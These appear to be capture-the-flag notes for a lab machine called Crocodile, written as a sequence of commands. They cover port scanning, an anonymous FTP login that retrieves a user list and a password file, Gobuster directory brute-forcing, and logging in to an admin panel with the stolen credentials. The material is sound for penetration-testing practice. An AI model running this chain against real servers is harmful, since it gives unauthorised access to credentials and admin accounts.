# Notes for Crocodile Machine

## Commands Used

### Terminal Workflow

# Nmap scan to identify open ports and services
```
nmap -sC -sV <IP>
```

# Connect to the FTP server
```
ftp <IP>
```
# Login as anonymous
# When prompted for credentials:
# Username: anonymous
# Password: <leave blank>


# List files in the FTP server
```
dir
```

# Download files from the FTP server
```
get allowed.userlist
get passwords.txt
```

# Exit FTP
```
exit
```
# View the downloaded files
```
cat allowed.userlist
cat passwords.txt
```

# Perform directory brute-forcing with Gobuster
```
gobuster dir --url http://<IP>/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
```

# Navigate to the discovered login page in a browser
# URL: http://<IP>/login.php

# Use credentials from the FTP files to log in to the admin panel
# Example:
# Username: admin
# Password: <password from passwords.txt>
